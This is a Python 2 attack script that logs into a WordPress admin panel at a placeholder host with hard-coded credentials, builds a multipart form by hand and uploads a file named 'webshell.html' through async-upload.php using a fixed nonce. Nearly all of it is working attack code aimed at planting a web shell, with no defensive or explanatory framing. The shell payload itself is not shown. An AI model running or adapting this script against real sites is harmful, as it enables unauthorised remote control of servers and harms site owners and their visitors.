import os, stat, mimetypes, httplib
import urllib, urllib2
from cookielib import CookieJar
import time


#form data setting class
def encode_multipart_formdata(fields, files):

    BOUNDARY = "--pluploadboundary%s" % (int)(time.time())
    CRLF = '\r\n'
    L = []
    for (key, value) in fields:
        L.append('--' + BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"' % key)
        L.append('')
        L.append(value)
    for (key, fd) in files:
        file_size = os.fstat(fd.fileno())[stat.ST_SIZE]
        filename = fd.name.split('/')[-1]
        contenttype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        L.append('--%s' % BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
        L.append('Content-Type: %s' % contenttype)
        fd.seek(0)
        L.append('\r\n' + fd.read())
    L.append('--' + BOUNDARY + '--')
    L.append('')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
    return content_type, body


#make a cookie and redirect handlers
cj = CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
#login processing URL
url = "http://server/wordpress/wp-login.php"


values = {
    "log": "python",
    "pwd": "python"
}
headers = {
    "User-Agent":"Mozilla/4.0(compatible;MISE 5.5; Windows NT)",
    "Referer":"http://server/wordpress/wp-admin/"
}


data = urllib.urlencode(values)
request = urllib2.Request(url, data, headers)
response = opener.open(request)

#fileupload processing URL
url = "http://server/wordpress/wp-admin/async-upload.php"
fields =  [
    ("post_id", "59"),
    ("_wpnonce", "7716717b8c"),
    ("action", "upload-attachment"),
    ("name", "webshell.html"),
           ]
fd = open("webshell.html", "rb")
files = [("async-upload", fd)]

#form data setting
content_type, body = encode_multipart_formdata(fields, files)
headers = {
    'User-Agent': 'Mozilla/4.0(compatible;MISE 5.5; Windows NT)',
    'Content-Type': content_type
    }

request = urllib2.Request(url, body, headers)
response = opener.open(request)
fd.close()
print response.read()
